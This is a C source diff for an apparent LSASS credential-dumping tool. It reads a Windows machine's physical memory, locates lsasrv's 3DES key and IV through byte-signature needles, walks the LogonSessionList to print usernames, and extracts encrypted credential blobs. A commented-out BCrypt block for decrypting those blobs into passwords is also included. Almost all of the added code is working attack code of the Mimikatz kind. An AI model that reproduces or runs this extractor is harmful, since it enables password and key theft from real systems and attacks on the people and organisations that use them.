@@ -1,5 +1,8 @@
 #include <Windows.h>
 #include <stdio.h>
+#include <subauth.h>
+#include <bcrypt.h>
+#include <ntstatus.h>
 #include "definitions.h"
 
 #pragma warning(disable:4996)
@@ -23,6 +26,44 @@ typedef struct {
 typedef struct {
     CHAR LogonSessionList[12];
 } LOGONSESSIONLIST_NEEDLE;
+
+typedef struct {
+    CHAR LsaInitialize[16];
+} LSAINITIALIZE_NEEDLE;
+
+
+
+
+typedef struct _KIWI_HARD_KEY {
+    ULONG cbSecret;
+    BYTE data[60]; // etc...
+} KIWI_HARD_KEY, * PKIWI_HARD_KEY;
+
+typedef struct _KIWI_BCRYPT_KEY81 {
+    ULONG size;
+    ULONG tag;	// 'MSSK'
+    ULONG type;
+    ULONG unk0;
+    ULONG unk1;
+    ULONG unk2;
+    ULONG unk3;
+    ULONG unk4;
+    PVOID unk5;	// before, align in x64
+    ULONG unk6;
+    ULONG unk7;
+    ULONG unk8;
+    ULONG unk9;
+    KIWI_HARD_KEY hardkey;
+} KIWI_BCRYPT_KEY81, * PKIWI_BCRYPT_KEY81;
+
+typedef struct _KIWI_BCRYPT_HANDLE_KEY {
+    ULONG size;
+    ULONG tag;	// 'UUUR'
+    PVOID hAlgorithm;
+    PKIWI_BCRYPT_KEY81 key;
+    PVOID unk0;
+} KIWI_BCRYPT_HANDLE_KEY, * PKIWI_BCRYPT_HANDLE_KEY;
+
 
 
 typedef struct{
@@ -156,7 +197,9 @@ void walkAVL(ULONGLONG VadRoot, ULONGLONG VadCount) {
     ULONGLONG LogonSessionList = 0;
     ULONGLONG LogonSessionList_offset = 0;
     ULONGLONG LogonSessionListCount_offset = 0;
-
+    ULONGLONG iv_offset = 0;
+    ULONGLONG hDes_offset = 0;
+    ULONGLONG hAES_offset = 0;
 
 
     printf("[+] Starting to walk _RTL_AVL_TREE...\n");
@@ -315,6 +358,63 @@ void walkAVL(ULONGLONG VadRoot, ULONGLONG VadCount) {
                 start = vadList[i].start + j;
             }
 
+
+
+
+            LSAINITIALIZE_NEEDLE LsaInitialize_needle= { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
+            PBYTE LsaInitialize_needle_buffer = (PBYTE)malloc(sizeof(LSAINITIALIZE_NEEDLE));
+            memcpy(LsaInitialize_needle_buffer, &LsaInitialize_needle, sizeof(LSAINITIALIZE_NEEDLE));
+            int offset_LsaInitialize_needle = 0;
+            offset_LsaInitialize_needle = memmem((PBYTE)lsasrv, j, LsaInitialize_needle_buffer, sizeof(LSAINITIALIZE_NEEDLE));
+            printf("Offset for InitializationVector/h3DesKey/hAesKey is %d\n", offset_LsaInitialize_needle);
+
+
+            memcpy(&iv_offset, lsasrv + offset_LsaInitialize_needle + 0x43, 4);  //IV offset
+            printf("IV Vector relative offset: 0x%08llx\n", iv_offset);
+            unsigned char* iv_vector = (unsigned char*)malloc(16);
+            memcpy(iv_vector, lsasrv + offset_LsaInitialize_needle + 0x43 + 4 +  iv_offset, 16);
+            printf("IV Vector: ");
+            for (int i = 0; i < 16; i++) {
+                printf("%02x", iv_vector[i]);
+            }
+            printf("\n");
+
+
+            memcpy(&hDes_offset, lsasrv + offset_LsaInitialize_needle - 0x59, 4); //DES KEY offset
+            printf("3DES Key relative offset: 0x%08llx\n", hDes_offset);
+            ULONGLONG des_pointer = 0;
+            large_start.QuadPart = v2p(vadList[i].start + offset_LsaInitialize_needle - 0x59 + 4 + hDes_offset);
+            des_pointer = readPhysMemPointer(large_start);
+            printf("3DES Key pointer: 0x%08llx\n", des_pointer);
+
+            KIWI_BCRYPT_HANDLE_KEY h3DesKey;
+            KIWI_BCRYPT_KEY81 extracted3DesKey;
+
+            large_start.QuadPart = v2p(des_pointer);
+            result = SetFilePointerEx(pmem_fd, large_start, NULL, FILE_BEGIN);
+            result = ReadFile(pmem_fd, &h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY), &bytes_read, NULL); 
+            large_start.QuadPart = v2p((ULONGLONG)h3DesKey.key);
+            result = SetFilePointerEx(pmem_fd, large_start, NULL, FILE_BEGIN);
+            result = ReadFile(pmem_fd, &extracted3DesKey, sizeof(KIWI_BCRYPT_KEY81), &bytes_read, NULL);
+            unsigned char* DES_key = (unsigned char*)malloc(extracted3DesKey.hardkey.cbSecret);
+            memcpy(DES_key, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
+            printf("3DES Key: ");
+            for (int i = 0; i < extracted3DesKey.hardkey.cbSecret; i++) {
+                printf("%02x", DES_key[i]);
+            }
+            printf("\n");
+
+
+
+
+
+
+
+
+
+
+
+
             LOGONSESSIONLIST_NEEDLE LogonSessionList_needle = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
             PBYTE needle_buffer = (PBYTE)malloc(sizeof(LOGONSESSIONLIST_NEEDLE));
             memcpy(needle_buffer, &LogonSessionList_needle, sizeof(LOGONSESSIONLIST_NEEDLE));
@@ -328,11 +428,76 @@ void walkAVL(ULONGLONG VadRoot, ULONGLONG VadCount) {
             LogonSessionList = vadList[i].start + offset + 0x17 + 4 + LogonSessionList_offset;
             printf("LogonSessionList: 0x%08llx\n", LogonSessionList);
             large_start.QuadPart = v2p(LogonSessionList);
-            printf("Test1: 0x%08llx\n", readPhysMemPointer(large_start));
-            large_start.QuadPart = v2p(LogonSessionList+8);
-            printf("Test2: 0x%08llx\n", readPhysMemPointer(large_start));
-            large_start.QuadPart = v2p(LogonSessionList + 264);
-            printf("Test3: 0x%08llx\n", readPhysMemPointer(large_start));
+            ULONGLONG currentElem = 0;
+            while (currentElem != LogonSessionList) {
+                if (currentElem == 0) {
+                    currentElem = LogonSessionList;
+                }
+                large_start.QuadPart = v2p(currentElem);
+                currentElem = readPhysMemPointer(large_start);
+                //printf("Element at: 0x%08llx\n", currentElem);
+                USHORT length = 0;
+                LPWSTR username = NULL;
+                ULONGLONG username_pointer = 0;
+
+                large_start.QuadPart = v2p(currentElem + 0x90);  //UNICODE_STRING = USHORT LENGHT USHORT MAXLENGTH LPWSTR BUFFER
+                result = SetFilePointerEx(pmem_fd, large_start, NULL, FILE_BEGIN);
+                result = ReadFile(pmem_fd, &length, 2, &bytes_read, NULL); //Read Lenght Field
+                username = (LPWSTR)malloc(length + 2);
+                memset(username, 0, length + 2);
+                large_start.QuadPart = v2p(currentElem + 0x98); 
+                username_pointer = readPhysMemPointer(large_start); //Read LPWSTR
+                large_start.QuadPart = v2p(username_pointer);
+                result = SetFilePointerEx(pmem_fd, large_start, NULL, FILE_BEGIN);
+                result = ReadFile(pmem_fd, username, length, &bytes_read, NULL); //Read string at LPWSTR
+                wprintf(L"Username: %s \n", username);
+                free(username);
+                
+                ULONGLONG credentials_pointer = 0;
+                large_start.QuadPart = v2p(currentElem + 0x108);
+                credentials_pointer = readPhysMemPointer(large_start);
+                printf("Credentials Pointer: 0x%08llx\n", credentials_pointer);
+
+                ULONGLONG primaryCredentials_pointer = 0;
+                large_start.QuadPart = v2p(credentials_pointer + 0x10);
+                primaryCredentials_pointer = readPhysMemPointer(large_start);
+                printf("Primary credentials Pointer: 0x%08llx\n", primaryCredentials_pointer);
+
+                USHORT cryptoblob_size = 0;
+                large_start.QuadPart = v2p(primaryCredentials_pointer + 0x18);
+                result = SetFilePointerEx(pmem_fd, large_start, NULL, FILE_BEGIN);
+                result = ReadFile(pmem_fd, &cryptoblob_size, 4, &bytes_read, NULL); 
+                printf("Cryptoblob size: 0x%x\n", cryptoblob_size);
+                
+                ULONGLONG cryptoblob_pointer = 0;
+                large_start.QuadPart = v2p(primaryCredentials_pointer + 0x20);
+                cryptoblob_pointer = readPhysMemPointer(large_start);
+                printf("Cryptoblob pointer: 0x%08llx\n", cryptoblob_pointer);
+
+                unsigned char* cryptoblob = (unsigned char*)malloc(cryptoblob_size);
+                large_start.QuadPart = v2p(cryptoblob_pointer);
+                result = SetFilePointerEx(pmem_fd, large_start, NULL, FILE_BEGIN);
+                result = ReadFile(pmem_fd, cryptoblob, cryptoblob_size, &bytes_read, NULL); 
+                printf("Cryptoblob:\n");
+                for (int i = 0; i < cryptoblob_size; i++) {
+                    printf("%02x", cryptoblob[i]);
+                }
+                printf("\n");
+
+               /* BCRYPT_ALG_HANDLE  hDesProvider;
+                BCRYPT_KEY_HANDLE  hDes;
+                ULONG result;
+                NTSTATUS status;
+
+                BCryptCryptOpenAlgorithmProvider(&hDesProvider, BCRYPT_3DES_ALGORITHM, NULL, 0);
+                BCryptSetProperty(hDesProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+                BCryptGenerateSymmetricKey(hDesProvider, &hDes, NULL, 0, DES_key, 16, 0);
+                status = BCryptDecrypt(hDes, (PUCHAR)cryptoblob, cryptoblob_size, 0, iv_vector, 8, decryptedPass, decryptedPassLen, &result, 0);
+
+                */
+            }
+
+            
 
 
 
